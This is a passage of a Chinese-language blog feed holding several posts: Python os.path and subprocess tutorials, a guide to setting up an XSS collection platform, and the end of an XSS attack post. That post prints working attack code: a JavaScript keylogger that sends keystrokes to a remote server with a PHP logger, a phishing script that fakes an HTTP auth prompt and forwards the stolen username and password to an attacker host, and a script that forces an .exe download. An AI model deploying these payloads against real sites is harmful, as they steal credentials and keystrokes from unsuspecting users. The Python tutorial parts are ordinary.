class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!js</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //接收服务器</span><br><span class="line">    var gate = &quot;data.php?data=&quot;;  //接收文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line">    var keys=&apos;&apos;;</span><br><span class="line">    </span><br><span class="line">    document.onkeypress = function(e) &#123;</span><br><span class="line">      get = window.event?event:e;</span><br><span class="line">      key = get.keyCode?get.keyCode:get.charCode;</span><br><span class="line">      key = String.fromCharCode(key);</span><br><span class="line">      keys+=key;</span><br><span class="line">    &#125;</span><br><span class="line">    window.setInterval(function()&#123;</span><br><span class="line">      new Image().src = server+gate+keys;</span><br><span class="line">      keys = &apos;&apos;;</span><br><span class="line">    &#125;, 1000);        </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$txt = $_GET[&apos;data&apos;];</span><br><span class="line">$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($log, $txt);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="网络钓鱼攻击"><a class="markdownIt-Anchor" href="#网络钓鱼攻击"></a> 网络钓鱼攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;);</span><br><span class="line"></span><br><span class="line">    header(&apos;HTTP/1.0 401 Unauthorized&apos;);</span><br><span class="line"></span><br><span class="line">    echo &apos;Authorization Required.&apos;;</span><br><span class="line"></span><br><span class="line">    exit;</span><br><span class="line"></span><br><span class="line">&#125; else if ((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/fish.jpg" alt="fish"><br><img src="/images/xssplatform.jpg" alt="xss"></p><h2 id="beef框架"><a class="markdownIt-Anchor" href="#beef框架"></a> Beef框架</h2><blockquote><p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p></blockquote><h2 id="xss蠕虫"><a class="markdownIt-Anchor" href="#xss蠕虫"></a> xss蠕虫</h2><blockquote><p>其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。</p></blockquote><h2 id="强制软件下载"><a class="markdownIt-Anchor" href="#强制软件下载"></a> 强制软件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //服务器</span><br><span class="line">    var gate = &quot;/test/test.exe&quot;; //要下载的文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line"></span><br><span class="line">    var link = document.createElement(&apos;a&apos;);</span><br><span class="line">    link.href = server+gate;</span><br><span class="line">    link.download = &apos;&apos;;</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    link.click();    </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; 概念&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/categories/security/xss/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python模块-os.path</title>
    <link href="http://yoursite.com/2018/06/14/python%E6%A8%A1%E5%9D%97-os-path/"/>
    <id>http://yoursite.com/2018/06/14/python模块-os-path/</id>
    <published>2018-06-14T14:02:49.000Z</published>
    <updated>2018-06-18T16:19:36.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>涉及到文件和文件夹的操作的一般有三个模块</p></blockquote><ol><li>os</li><li>os.path</li><li>shutil</li></ol><h1 id="ospath"><a class="markdownIt-Anchor" href="#ospath"></a> os.path</h1><blockquote><p>os.path 模块，顾名思义就是针对于系统的文件路径啊，判断是否为文件啊等等行为做出处理的模块。</p></blockquote><h2 id="ospathabspathpath"><a class="markdownIt-Anchor" href="#ospathabspathpath"></a> os.path.abspath(path)</h2><blockquote><p>返回<mark>当前绝对路径+path参数</mark>的字符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)</span><br><span class="line">&apos;/Users/xxxx&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;~&apos;)</span><br><span class="line">&apos;/Users/xxxx/~&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;logs&apos;)</span><br><span class="line">&apos;/Users/xxxx/logs&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathbasenamepath"><a class="markdownIt-Anchor" href="#ospathbasenamepath"></a> os.path.basename(path)</h2><blockquote><p>返回路径下面的文件名的字符串。(这个文件路径可能不存在)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.basename(&apos;/user/johnw/test.txt&apos;)</span><br><span class="line"># &apos;test.txt&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathcommonpathpath1path2"><a class="markdownIt-Anchor" href="#ospathcommonpathpath1path2"></a> os.path.commonpath([path1,path2])</h2><blockquote><p>接受一个序列，得到两个字符串中相同的文件路径（一定要是路径字符串）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.commonpath([&apos;/user/johnw/log.txt&apos;,&apos;/user/johnw/logs/test.txt&apos;])</span><br><span class="line">&apos;/user/johnw&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathcommonprefixpath1path2"><a class="markdownIt-Anchor" href="#ospathcommonprefixpath1path2"></a> os.path.commonprefix([path1,path2])</h2><blockquote><p>顾名思义，接受路径字符的序列，比较前缀</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.commonprefix([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])</span><br><span class="line">&apos;/usr/l&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.commonpath([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])</span><br><span class="line">&apos;/usr&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathdirnamepath"><a class="markdownIt-Anchor" href="#ospathdirnamepath"></a> os.path.dirname(path)</h2><blockquote><p>返回路径字符串中的关于文件夹的路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/&apos;)</span><br><span class="line">&apos;/usr/local/src&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/test.txt&apos;)</span><br><span class="line">&apos;/usr/local/src&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathexistspath"><a class="markdownIt-Anchor" href="#ospathexistspath"></a> os.path.exists(path)</h2><blockquote><p>判断文件路径是否真实存在</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local/src&apos;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local/sbin&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="ospathexpanduserpath"><a class="markdownIt-Anchor" href="#ospathexpanduserpath"></a> os.path.expanduser(path)</h2><blockquote><p>把path中包含的&quot;<sub>&quot;和&quot;</sub>user&quot;转换成用户目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.expanduser(&apos;~&apos;)</span><br><span class="line">&apos;/Users/xxx&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathexpandvarspath"><a class="markdownIt-Anchor" href="#ospathexpandvarspath"></a> os.path.expandvars(path)</h2><blockquote><p>根据环境变量，替换路径存在的$name 和 ${name} 的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.expandvars(&apos;$PYENV_ROOT&apos;)</span><br><span class="line">&apos;/Users/xxx/.pyenv&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathgetatimepath"><a class="markdownIt-Anchor" href="#ospathgetatimepath"></a> os.path.getatime(path)</h2><h2 id="ospathgetmtimepath"><a class="markdownIt-Anchor" href="#ospathgetmtimepath"></a> os.path.getmtime(path)</h2><h2 id="ospathgetctimepath"><a class="markdownIt-Anchor" href="#ospathgetctimepath"></a> os.path.getctime(path)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">文件的 Access time，atime 是在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变。</span><br><span class="line"></span><br><span class="line">文件的Modified time，mtime 是在写入文件时随文件内容的更改而更改的。</span><br><span class="line"></span><br><span class="line">文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。只要stat出来的内容发生改变就会发生改变。mtime的改变必然导致ctime的改变。</span><br><span class="line"></span><br><span class="line">文件夹的 Access time，atime 是在读取文件或者执行文件时更改的（我们只cd进入一个目录然后cd ..不会引起atime的改变，但ls一下就不同了）。</span><br><span class="line"></span><br><span class="line">文件夹的 Modified time，mtime 是在文件夹中有文件的新建、删除才会改变</span><br><span class="line"></span><br><span class="line">文件夹的 Change time，ctime 基本同文件的ctime，其体现的是inode的change time。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.getatime(&apos;/Users/xxxx/demo.py&apos;)</span><br><span class="line">1524670536.2193816</span><br></pre></td></tr></table></figure><h2 id="ospathgetsizepath"><a class="markdownIt-Anchor" href="#ospathgetsizepath"></a> os.path.getsize(path)</h2><blockquote><p>得到文件的大小。 以bytes为单位。如果不存在或者路径错误，返回OSError</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[21:31:34] xxx ➜ ~» ls -hl demo.py </span><br><span class="line">-rw-r--r--  1 xxxx  staff    21B Apr 25 23:35 demo.py</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.getsize(&apos;/Users/wenzhongwei/demo.py&apos;)</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h2 id="ospathisabspath"><a class="markdownIt-Anchor" href="#ospathisabspath"></a> os.path.isabs(path)</h2><blockquote><p>如果是绝对路径，返回True</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isabs(&apos;/user&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="ospathisfilepath"><a class="markdownIt-Anchor" href="#ospathisfilepath"></a> os.path.isfile(path)</h2><h2 id="ospathisdirpath"><a class="markdownIt-Anchor" href="#ospathisdirpath"></a> os.path.isdir(path)</h2><h2 id="ospathislinkpath"><a class="markdownIt-Anchor" href="#ospathislinkpath"></a> os.path.islink(path)</h2><h2 id="ospathismountpath"><a class="markdownIt-Anchor" href="#ospathismountpath"></a> os.path.ismount(path)</h2><blockquote><p>顾名思义，判断语句.会先判断这个路径字符是否真实存在，如果不存在，返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(&apos;/user/text.txt&apos;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.path.isfile(&apos;/Users/xxx/demo.py&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="ospathjoinpath"><a class="markdownIt-Anchor" href="#ospathjoinpath"></a> os.path.join(path)</h2><blockquote><p>将字符拼接成合适的字符路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.join(&apos;usr&apos;,&apos;src&apos;)</span><br><span class="line">&apos;usr/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;/usr&apos;,&apos;src&apos;)</span><br><span class="line">&apos;/usr/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;C:&apos;,&apos;src&apos;)</span><br><span class="line">&apos;C:/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;c:&apos;,&apos;src&apos;)</span><br><span class="line">&apos;c:/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;test&apos;,&apos;.src&apos;)</span><br><span class="line">&apos;test/.src&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathnormcasepath"><a class="markdownIt-Anchor" href="#ospathnormcasepath"></a> os.path.normcase(path)</h2><h2 id="ospathnormpathpath"><a class="markdownIt-Anchor" href="#ospathnormpathpath"></a> os.path.normpath(path)</h2><blockquote><p>格式化字符路径，使之符合当前系统格式</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.normcase(&apos;/User/local&apos;)</span><br><span class="line">&apos;/User/local&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathrealpathpath"><a class="markdownIt-Anchor" href="#ospathrealpathpath"></a> os.path.realpath(path)</h2><blockquote><p>返回字符路径的真实路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.realpath(&apos;.&apos;)</span><br><span class="line">&apos;/Users/xxx&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathrelpathpath"><a class="markdownIt-Anchor" href="#ospathrelpathpath"></a> os.path.relpath(path)</h2><blockquote><p>返回相对路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.relpath(&apos;/Users/xxx&apos;)</span><br><span class="line">&apos;.&apos;</span><br></pre></td></tr></table></figure><h2 id="ospathsamefilepath1path2"><a class="markdownIt-Anchor" href="#ospathsamefilepath1path2"></a> os.path.samefile(path1,path2)</h2><blockquote><p>如果两个文件名都是指向同一个文件的话，返回True，this is determined by the device number and i-node number</p></blockquote><h2 id="ospathsameopenfilefp1fp2"><a class="markdownIt-Anchor" href="#ospathsameopenfilefp1fp2"></a> os.path.sameopenfile(fp1,fp2)</h2><h2 id="ospathsplitpath"><a class="markdownIt-Anchor" href="#ospathsplitpath"></a> os.path.split(path)</h2><blockquote><p>切割成 路径 ， 文件名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.split(&apos;/usr/local/test.txt&apos;)</span><br><span class="line">(&apos;/usr/local&apos;, &apos;test.txt&apos;)</span><br></pre></td></tr></table></figure><h2 id="ospathsplitextpath"><a class="markdownIt-Anchor" href="#ospathsplitextpath"></a> os.path.splitext(path)</h2><blockquote><p>切割成路径 ， 后缀名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.splitext(&apos;/usr/local/test.txt&apos;)</span><br><span class="line">(&apos;/usr/local/test&apos;, &apos;.txt&apos;)</span><br></pre></td></tr></table></figure><h2 id="ospathsupports_unicode_filename"><a class="markdownIt-Anchor" href="#ospathsupports_unicode_filename"></a> os.path.supports_unicode_filename</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;涉及到文件和文件夹的操作的一般有三个模块&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;os&lt;/li&gt;
&lt;li
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>XSS平台的搭建</title>
    <link href="http://yoursite.com/2018/06/14/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2018/06/14/XSS平台的搭建/</id>
    <published>2018-06-14T12:20:09.000Z</published>
    <updated>2018-06-14T15:27:07.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lnmp环境搭建"><a class="markdownIt-Anchor" href="#lnmp环境搭建"></a> lnmp环境搭建</h1><h3 id="下载"><a class="markdownIt-Anchor" href="#下载"></a> 下载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://lnmp.org/download.html</span><br><span class="line"></span><br><span class="line">tar -zxvf lnmp1.5-full.tar.gz</span><br><span class="line">./install.sh lnmp</span><br><span class="line">或者</span><br><span class="line">./install.sh lamp</span><br></pre></td></tr></table></figure><h1 id="xss平台"><a class="markdownIt-Anchor" href="#xss平台"></a> XSS平台</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 下载xss平台</span><br><span class="line">https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip</span><br><span class="line"></span><br><span class="line">2. 数据库配置</span><br><span class="line">打开phpmyadmin，</span><br><span class="line">新建数据库 poppy</span><br><span class="line">将解压出来的xss.sql移动到 phpmyadmin/upload 目录下面</span><br><span class="line">在phpmyadmin选择导入，执行。成功导入数据库</span><br><span class="line"></span><br><span class="line">3.config.php</span><br><span class="line"></span><br><span class="line">$config[&apos;register&apos;] = &apos;normal&apos; //invite需要邀请码</span><br><span class="line"></span><br><span class="line">$config[&apos;dBPwd&apos;]=&apos;xxx&apos;</span><br><span class="line">$config[&apos;urlroot&apos;] = 192.168.31.xx</span><br></pre></td></tr></table></figure><h1 id="xss_url-为404"><a class="markdownIt-Anchor" href="#xss_url-为404"></a> xss_url 为404</h1><h3 id="nginx-的解决方式"><a class="markdownIt-Anchor" href="#nginx-的解决方式"></a> nginx 的解决方式</h3><ol><li>通过转换.htaccess: <a href="http://www.anilcetin.com/convert-apache-htaccess-to-nginx/" target="_blank" rel="noopener">http://www.anilcetin.com/convert-apache-htaccess-to-nginx/</a></li><li>将转换后的内容写入/usr/local/nginx/config/my.conf</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last;</span><br><span class="line">rewrite ^/do/auth/(w+?)(/domain/([w.]+?))?$ /;</span><br><span class="line">rewrite ^/register/(.*?)$ /index.php?do=register&amp;key=$1 last;</span><br><span class="line">rewrite ^/register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="apache的解决方式新增-htaccess"><a class="markdownIt-Anchor" href="#apache的解决方式新增-htaccess"></a> apache的解决方式,新增 .htaccess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L] </span><br><span class="line">RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L] </span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L] </span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>然后修改apache的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None ==&gt; AllowOverride All</span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://thief.one/2017/03/15/Xss%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">https://thief.one/2017/03/15/Xss平台搭建小记/</a></p><p><a href="https://zhuanlan.zhihu.com/p/27020543" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27020543</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;lnmp环境搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#lnmp环境搭建&quot;&gt;&lt;/a&gt; lnmp环境搭建&lt;/h1&gt;
&lt;h3 id=&quot;下载&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#下载&quot;&gt;&lt;/a&gt; 
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/categories/security/xss/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python模块-subprocess</title>
    <link href="http://yoursite.com/2018/06/13/python%E6%A8%A1%E5%9D%97-subprocess/"/>
    <id>http://yoursite.com/2018/06/13/python模块-subprocess/</id>
    <published>2018-06-13T00:31:54.000Z</published>
    <updated>2018-06-18T16:19:30.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统的命令</p></blockquote><h1 id="代码结构及其实例"><a class="markdownIt-Anchor" href="#代码结构及其实例"></a> 代码结构及其实例</h1><h2 id="run"><a class="markdownIt-Anchor" href="#run"></a> run</h2><blockquote><p>官方推荐其使用 run  方法。这是一个封装好的subprocess方法, 返回一个CompleteProcess 实例</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None)</span><br></pre></td></tr></table></figure><h3 id="代码1"><a class="markdownIt-Anchor" href="#代码1"></a> 代码1：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"># 运行后不会有输出</span><br><span class="line">a = subprocess.run(&apos;ls -al&apos;,shell=True,stdout=subprocess.PIPE)</span><br><span class="line"># 输出</span><br><span class="line">a.stdout</span><br></pre></td></tr></table></figure><h3 id="代码2"><a class="markdownIt-Anchor" href="#代码2"></a> 代码2：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">b = subprocess.run([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)</span><br><span class="line">b.stdout</span><br><span class="line">CompleteProcess对象有以下参数：</span><br><span class="line">args: 用于执行的命令，比如 ls -al, [&apos;ls&apos;,&apos;-al&apos;]</span><br><span class="line">returnCode: 退出进程后，返回值</span><br><span class="line">stdout: 命令输出</span><br><span class="line">stderr: 命令错误时输出</span><br></pre></td></tr></table></figure><h1 id="subprocess构造函数"><a class="markdownIt-Anchor" href="#subprocess构造函数"></a> subprocess构造函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, 